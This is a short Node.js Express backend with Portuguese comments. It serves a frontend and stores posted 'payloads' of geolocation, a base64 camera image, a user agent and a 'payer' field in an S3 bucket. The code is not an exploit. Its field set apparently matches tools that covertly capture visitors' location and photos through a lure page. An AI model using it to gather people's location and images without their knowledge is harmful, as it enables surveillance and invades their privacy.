const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const { S3Client, PutObjectCommand } = require('@aws-sdk/client-s3');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// Configura S3 usando variáveis de ambiente
const s3 = new S3Client({
  region: process.env.AWS_REGION,
  endpoint: process.env.S3_ENDPOINT,
  credentials: {
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
  },
});
const BUCKET_NAME = process.env.S3_BUCKET_NAME;

// Serve frontend
app.use(express.static(path.join(__dirname, '../frontend')));
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Endpoint para receber localização e imagem
app.post('/upload', async (req, res) => {
  try {
    const { timestamp, payer, location, image, userAgent } = req.body;
    console.log('=== NOVO PAYLOAD ===');
    console.log('Timestamp:', timestamp);
    console.log('Payer:', payer);
    console.log('Location:', location);
    console.log('Tem imagem?', !!image);
    console.log('User-Agent:', userAgent);

    const timestampNow = Date.now();

    // Salva JSON no S3
    const jsonKey = `${timestampNow}_data.json`;
    await s3.send(new PutObjectCommand({
      Bucket: BUCKET_NAME,
      Key: jsonKey,
      Body: JSON.stringify({ timestamp, payer, location, userAgent }, null, 2),
      ContentType: 'application/json'
    }));
    console.log(`JSON enviado para o S3: ${jsonKey}`);

    // Salva imagem no S3 apenas se existir
    if (image && image.startsWith('data:image/')) {
      const base64Data = Buffer.from(image.replace(/^data:image\/png;base64,/, ""), 'base64');
      const imgKey = `${timestampNow}_photo.png`;
      await s3.send(new PutObjectCommand({
        Bucket: BUCKET_NAME,
        Key: imgKey,
        Body: base64Data,
        ContentType: 'image/png'
      }));
      console.log(`Imagem enviada para o S3: ${imgKey}`);
    } else {
      console.log('Nenhuma imagem enviada ou formato inválido, pulando upload de foto.');
    }

    res.status(200).json({ success: true });
  } catch (err) {
    console.error('Erro ao salvar dados:', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend rodando na porta ${PORT}`));
